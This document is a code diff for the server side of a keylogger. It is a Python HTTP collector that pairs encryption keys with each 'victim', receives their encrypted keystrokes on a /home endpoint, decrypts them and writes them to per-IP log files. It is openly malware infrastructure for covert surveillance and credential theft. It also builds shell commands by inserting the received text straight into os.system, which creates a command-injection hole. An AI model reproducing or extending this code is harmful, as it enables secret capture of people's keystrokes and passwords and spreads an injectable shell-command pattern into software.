@@ -8,53 +8,22 @@ from cryptography.hazmat.backends import default_backend
 from os import system
 import base64
 from secrets import token_urlsafe
+from settings import *
 
-'''
-TODO: fully support multiclient
-'''
 
-SERVER_IP = "localhost"
-SERVER_PORT = 8000
-
-ratchet = double_ratchet.Ratchet()
 clients = []
-
-
-def get_public_key() -> bytes:
-    global ratchet
-    return ratchet.getPublicKey()
-
-def decrypt(enc_msg: bytes) -> str:
-    global ratchet
-    msg = ratchet.decrypt(enc_msg)
-    ratchet.updateDH()
-    return msg
-
-def pair_comm(pubkey: bytes) -> None:
-    global ratchet
-    dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
-    ratchet.pairComm(dhpub)
-
-def update_ratchet(token: str) -> None:
-    global ratchet
-    ratchet.updateDH()
-    ratchet.getPublicKey().decode('utf-8')
-    with open(token, 'w') as f:
-        f.write(get_public_key().decode('ascii'))
-
-def reinit_ratchet() -> None:
-    global ratchet
-    ratchet = double_ratchet.Ratchet()
 
 
 class MyServer(BaseHTTPRequestHandler):
 
+
     def __init__(self, *args, **kwargs):
-        self.client = None
         super().__init__(*args, **kwargs)
     
+
     def log_message(self, format, *args):
         return
+
 
     def __set_response(self):
         path = self.path.replace('/','')
@@ -64,10 +33,10 @@ class MyServer(BaseHTTPRequestHandler):
                 self.send_header('Content-type','text/html')
                 self.end_headers()
                 self.wfile.write(bytes(f.read(), 'ascii'))
-                f.close()
                 return
         except IOError:
             self.send_error(404,'File Not Found: %s' % self.path)
+
 
     def do_GET(self):
         global clients
@@ -76,48 +45,51 @@ class MyServer(BaseHTTPRequestHandler):
         if (self.path == '/login'):
             # received a new connection
             if not any(ip in cp for cp in clients):
-                clients.append({ip, token_urlsafe(16)})
+                clients.append([ip, token_urlsafe(16), double_ratchet.Ratchet()])
                 print("Client connected: ", ip)
                 system("date >> "+f_path+";echo 'Client connected' >> " + f_path)
-            # old connections can call login endpoint to renew their keys
-            # update/create the client key
+            # old connections can call login endpoint to update their keys
+            # get the token and ratchet for each client
+            ip, token, ratchet = [d for d in clients if ip in d].pop()
             print("Renewing keys")
+            # update keys
             key = str(self.headers).split('Session:')[1]
             pubkey = base64.b64decode(key.encode('ascii'))
-            pair_comm(pubkey)
+            dhpub: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
+            ratchet.pairComm(dhpub)
             # just update the public key under a the random client endpoint
-            token = list([d for d in clients if ip in d][0])[1]
             with open(token, 'w') as f:
-                f.write(get_public_key().decode('ascii'))
-            # send endpoint to client
+                f.write(ratchet.getPublicKey().decode('ascii'))
+            # send endpoint to client in location header
             self.send_response(200)
             self.send_header('Content-type','text/html')
             self.send_header('Location', token)
             self.end_headers()
             self.wfile.write(bytes(token, 'ascii'))
-
+            return
         elif self.path == '/logout':
             # client disconnected due to an error
             clients = [d for d in clients if ip not in d]
             print("Client disconnected: ", ip)
-            reinit_ratchet()
             system("date >> "+f_path+";echo 'Client disconnected' >> " + f_path)
         self.__set_response()
 
+
     def do_POST(self):
         global clients
-        ip = self.client_address[0]
-        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
-        #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data.decode('utf-8'))
+        content_length = int(self.headers['Content-Length'])
+        # at this endpoint victims send their encrypted keystrokes
         if self.path == '/home':
+            ip, token, ratchet = [d for d in clients if self.client_address[0] in d].pop()
             f_path = "logs/" + ip
-            b64_msg = self.rfile.read(content_length) # <--- Gets the data itself
+            b64_msg = self.rfile.read(content_length)
             enc_msg = base64.b64decode(b64_msg)
-            msg = decrypt(enc_msg)
+            msg = ratchet.decrypt(enc_msg)
             print(ip + ': ' + msg)
             system("date >> "+f_path+";echo '"+msg+"' >> " + f_path)
-            token = list([d for d in clients if ip in d][0])[1]
-            update_ratchet(token)
+            ratchet.updateDH()
+            with open(token, 'w') as f:
+                f.write(ratchet.getPublicKey().decode('ascii'))
         self.__set_response()
 
 
@@ -132,6 +104,7 @@ def run(server_class=HTTPServer, handler_class=MyServer):
         pass
     httpd.server_close()
     logging.info('Stopping httpd...\n')
+
 
 
 run()
